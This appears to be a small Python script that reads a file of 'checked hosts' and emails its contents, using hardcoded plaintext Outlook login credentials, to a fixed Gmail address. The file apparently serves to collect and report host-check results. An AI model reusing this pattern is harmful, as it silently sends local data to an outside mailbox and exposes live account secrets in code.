# hoster_by_DiyRex@outlook.com:Hoster1234

import smtplib

with open("checked_hosts.txt") as file:
    list = []
    for line in file:
        list.append(line)

body = 'Subject: Hoster .\nDear ContactName, \n\n' + '\n'.join(list)
try:
    smtpObj = smtplib.SMTP('smtp-mail.outlook.com', 587)
except Exception as e:
    print(e)
    smtpObj = smtplib.SMTP_SSL('smtp-mail.outlook.com', 465)
#type(smtpObj) 
smtpObj.ehlo()
smtpObj.starttls()
smtpObj.login('hoster_by_DiyRex@outlook.com', "Hoster1234") 
smtpObj.sendmail('hoster_by_DiyRex@outlook.com', 'rexdevin8@gmail.com', body) # Or recipient@outlook

smtpObj.quit()
pass